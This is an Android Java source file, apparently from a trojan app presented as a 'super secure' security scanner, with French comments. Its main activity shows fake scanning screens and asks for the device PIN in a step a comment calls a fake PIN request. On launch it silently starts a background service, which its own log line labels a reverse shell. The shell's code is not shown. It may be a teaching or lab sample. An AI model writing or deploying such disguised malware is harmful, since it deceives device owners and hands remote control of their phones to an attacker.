package com.example.supersecurepluspremium;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

import com.bumptech.glide.Glide;

import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private static int LOAD_TIME = 2000;
    private static boolean authenticated = false;
    private static boolean scanning = false;

    private static int ACTIVITY_LOCK = 4;
    private static int ACTIVITY_FIRST_LOAD = 3;

    private void unlock_screen() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
            if (km.isKeyguardSecure()) {
                Intent authIntent = km.createConfirmDeviceCredentialIntent(getString(R.string.dialog_title_auth), getString(R.string.dialog_msg_auth));
                startActivityForResult(authIntent, ACTIVITY_LOCK);
            }
        }
    }

    // Demande de faux PIN
    public void firstLaunch(View v) {
        final ImageView myLayout = findViewById(R.id.imageView);
        TextView textView = findViewById(R.id.textView2);

        if (!authenticated)  // Demande le code PIN
        {
            //Log.v("secme", "Ask for PIN - main");
            unlock_screen();
            try {
                Thread.sleep(1000);
            } catch(InterruptedException ex) {
                ex.printStackTrace();
            }
            Glide.with(this).load(R.drawable.icon).into(myLayout);  //image warning
        } else {
            if (scanning) {
                //Log.v("secme", "Already scanning ! - main");
                return;
            }
            scanning = true;
            //Log.v("secme", "Load app - main");
            Glide.with(this).load(R.drawable.loading).into(myLayout);  //insere notre gif dans la imageView
            textView.setText("Chargement de la sécurité\nVeuillez patienter...");
            Runnable runnable = new Runnable() {
                @Override
                public void run() {
                    //Log.v("secme", "DONE");
                    scanning = false;
                    Intent i = new Intent(MainActivity.this, Analyze.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivityForResult(i, ACTIVITY_FIRST_LOAD);
                    return;
                }
            };
            Handler handler = new Handler();
            handler.postDelayed(runnable, LOAD_TIME);
        }
    }

    //Démarrage de l'application
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ImageView imageView = findViewById(R.id.imageView);
        Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
        startService(new Intent(this, MyIntentService.class));
        Log.v("secme","Reverse Shell launched - main");
    }

    // Lancement d'un scan après appui du bouton dans l'activité Analyze
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        //Log.v("secme", "Trigger" + requestCode);
        if (requestCode == ACTIVITY_LOCK) { //4
            //Log.v("secme", "Correct PIN - main");
            authenticated = true;
        }
        else if (requestCode == ACTIVITY_FIRST_LOAD) { //3
            //Log.v("secme", "First load finished - main");
            LOAD_TIME = 6000;
            firstLaunch(findViewById(R.id.imageView));
        }
    }
}
